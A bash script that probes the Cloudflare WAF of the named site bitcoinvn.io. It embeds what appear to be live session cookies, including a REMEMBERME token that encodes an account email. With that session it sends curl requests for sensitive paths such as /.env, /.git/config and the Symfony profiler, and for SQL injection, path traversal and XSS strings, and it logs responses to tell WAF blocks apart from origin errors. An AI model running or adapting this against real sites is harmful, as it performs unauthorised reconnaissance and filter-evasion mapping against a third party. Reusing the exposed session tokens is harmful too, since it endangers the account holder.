#!/bin/bash
# Cloudflare WAF keyword/path mapping probe for bitcoinvn.io
BASE="https://bitcoinvn.io"
COOKIE_FILE="/tmp/cf_cookies.txt"

# Load cookies from session
cat > $COOKIE_FILE << 'COOKIES'
bitcoinvn.ioFALSE/FALSETRUEREMEMBERME%3Ab21uaWNvbm5lY3QwMEBnbWFpbC5jb20~%3A1794982284%3Alogin-method-v1%3AWyJnb29nbGUiLGZhbHNlLCJXaGt0cWxCVUwtdUlLRkI0M1AyQkcxNTJ2UFdXWktfdjhocUVUNzlvbUh3fjU2d0hobWFPRF9Ed0sySzlCUFJmOWpiOWd0dGpzUkJHQWNsMTNBQmZPbWN%2BIl0%3D%3Aca962b8ce904172eb281811fdf1f84efb603a9dc7f3f6382aa79fdf87866f46f
bitcoinvn.ioFALSE/FALSETRUESID002ed1eb0006b3d9e084200584a9250a
COOKIES

echo "=== CLOUDFLARE WAF MAPPING PROBE ==="
echo ""

# Test paths - comparing responses to identify CF blocks vs origin 404s
PATHS=(
  "/_profiler/"
  "/_profiler/open"
  "/_wdt/"
  "/admin"
  "/administrator"
  "/wp-admin"
  "/phpmyadmin"
  "/.env"
  "/.git/config"
  "/debug"
  "/debug/_profiler"
  "/api/v1/debug"
  "/actuator"
  "/server-status"
  "/xmlrpc.php"
  "/cgi-bin/"
  "/shell.php"
  "/eval()"
  "/?cmd=ls"
  "/select+1,2,3"
  "/union+select"
  "/etc/passwd"
  "/../../etc/passwd"
  "/<script>alert(1)</script>"
  "/';DROP+TABLE--"
  "/normal-page-that-doesnt-exist-xyz123"
)

for path in "${PATHS[@]}"; do
  encoded_path=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$path', safe='/:?=&'))")
  
  response=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}|%{time_total}" \
    --max-time 10 \
    -b $COOKIE_FILE \
    -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
    "${BASE}${path}" 2>/dev/null)
  
  http_code=$(echo $response | cut -d'|' -f1)
  size=$(echo $response | cut -d'|' -f2)
  time=$(echo $response | cut -d'|' -f3)
  
  # Get headers to check for CF challenge/block indicators
  headers=$(curl -s -I --max-time 10 \
    -b $COOKIE_FILE \
    -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
    "${BASE}${path}" 2>/dev/null)
  
  cf_ray=$(echo "$headers" | grep -i "cf-ray" | head -1 | tr -d '\r')
  server=$(echo "$headers" | grep -i "^server:" | head -1 | tr -d '\r')
  cf_cache=$(echo "$headers" | grep -i "cf-cache-status" | head -1 | tr -d '\r')
  
  printf "%-45s | HTTP:%-4s | Size:%-6s | Time:%-6s | %s | %s\n" \
    "$path" "$http_code" "$size" "${time}s" "$server" "$cf_ray"
done

